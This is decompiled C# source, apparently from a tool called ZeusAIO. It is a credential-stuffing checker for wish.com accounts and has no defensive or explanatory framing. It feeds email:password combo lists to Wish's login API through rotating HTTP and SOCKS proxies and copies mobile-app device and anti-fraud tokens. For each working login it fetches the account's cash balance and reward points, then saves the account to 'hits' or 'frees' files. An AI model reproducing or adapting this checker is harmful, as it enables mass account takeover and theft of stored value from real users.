// Decompiled with JetBrains decompiler
// Type: Wish.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace Wish
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AllowAutoRedirect = false;
            httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
            httpRequest.AddHeader("Content-Type", "application/x-www-form-urlencoded");
            httpRequest.AddHeader("Cookie", "_xsrf=1;");
            HttpResponse httpResponse = httpRequest.Post(new Uri("https://www.wish.com/api/email-login?email=" + s[0] + "&password=" + s[1] + "&session_refresh=false&app_device_id=13dc8379-82b2-3b01-aeab-592a7c78ed38&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C61%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C85%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C109%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C152%2C154%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C193%2C194%2C195%2C196%2C197%2C198%2C199%2C200%2C201%2C202%2C203%2C204%2C205%2C206%2C207%2C209&_app_type=wish&_riskified_session_token=9cd23af4-f035-4fb2-809b-c0fede01d029&_threat_metrix_session_token=7625-6c870f21-b654-4d63-b79d-e607cd23f212&advertiser_id=caf72538-cf4c-4328-9c1c-a4f33e16d6d4&_version=4.36.1&app_device_model=SM-G930K"));
            if (httpResponse.ToString().Contains("\"session_token\""))
            {
              string str = Check.WishGetPointsAndBalance(Uri.UnescapeDataString(httpResponse.Cookies.GetCookies("https://www.wish.com")["sweeper_session"].Value.Replace("%22", ""))).Replace("\\u00a0", "").Replace("\\u010d", "").Replace("\\u20bd", "");
              if (str == "")
              {
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - WISH] " + s[0] + ":" + s[1] + " | Balance: ? - Points: ?", Color.Green);
                Export.AsResult("/Wish_hits", s[0] + ":" + s[1] + " | Balance: ? - Points: ?");
                return false;
              }
              if (str.Contains("0.00") || str.Contains("0,00"))
              {
                ++mainmenu.frees;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[FREE - WISH] " + s[0] + ":" + s[1], Color.OrangeRed);
                Export.AsResult("/Wish_frees", s[0] + ":" + s[1]);
                return false;
              }
              ++mainmenu.hits;
              if (mainmenu.p1 == "2")
                Colorful.Console.WriteLine("[HIT - WISH] " + s[0] + ":" + s[1], Color.Green);
              Export.AsResult("/Wish_hits", s[0] + ":" + s[1]);
              return false;
            }
            break;
          }
        }
        catch (Exception ex)
        {
          ++mainmenu.errors;
        }
      }
      return false;
    }

    private static string WishGetPointsAndBalance(string sweeper_session)
    {
      while (true)
      {
        try
        {
          using (HttpRequest httpRequest = new HttpRequest())
          {
            string proxyAddress = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
            if (mainmenu.proxyProtocol == "HTTP")
              httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS4")
              httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxyAddress);
            if (mainmenu.proxyProtocol == "SOCKS5")
              httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxyAddress);
            httpRequest.IgnoreProtocolErrors = true;
            httpRequest.AllowAutoRedirect = false;
            httpRequest.AddHeader("Cookie", "_xsrf=1; sweeper_session=" + sweeper_session + ";");
            HttpResponse httpResponse = httpRequest.Post(new Uri("https://www.wish.com/api/redeemable-rewards/get-rewards?get_dashboard_info=true&offset=0&count=20&reward_type=1&app_device_id=13dc8379-82b2-3b01-aeab-592a7c78ed38&_xsrf=1&_client=androidapp&_capabilities=2,3,4,6,7,9,11,12,13,15,21,24,25,28,35,37,39,40,43,46,47,49,50,51,52,53,55,57,58,60,61,64,65,67,68,70,71,74,76,77,78,80,82,83,85,86,90,93,94,95,96,100,101,102,103,106,108,109,110,111,153,114,115,117,118,122,123,124,125,126,128,129,132,133,134,135,138,139,146,147,148,149,150,152,154,155,156,157,159,160,161,162,163,164,165,166,171,172,173,174,175,176,177,180,181,182,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,209&_app_type=wish&_riskified_session_token=9cd23af4-f035-4fb2-809b-c0fede01d029&_threat_metrix_session_token=7625-6c870f21-b654-4d63-b79d-e607cd23f212&advertiser_id=caf72538-cf4c-4328-9c1c-a4f33e16d6d4&_version=4.36.1&app_device_model=SM-G930K"));
            string str1 = httpResponse.ToString();
            if (httpResponse.StatusCode == HttpStatusCode.OK)
            {
              string str2 = ((JObject) JsonConvert.DeserializeObject(str1))["data"][(object) "dashboard_info"][(object) "available_points"].ToString();
              string input;
              do
              {
                httpRequest.AddHeader("Cookie", "_xsrf=1; sweeper_session=" + sweeper_session);
                input = httpRequest.Get(new Uri("https://www.wish.com/cash")).ToString();
              }
              while (!input.Contains("\"wish_cash_balance\""));
              return "Balance: " + Regex.Match(input, "\"wish_cash_balance\": \"(.*?)\"").Groups[1].Value + " - Points: " + str2;
            }
          }
        }
        catch
        {
          ++mainmenu.errors;
        }
      }
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
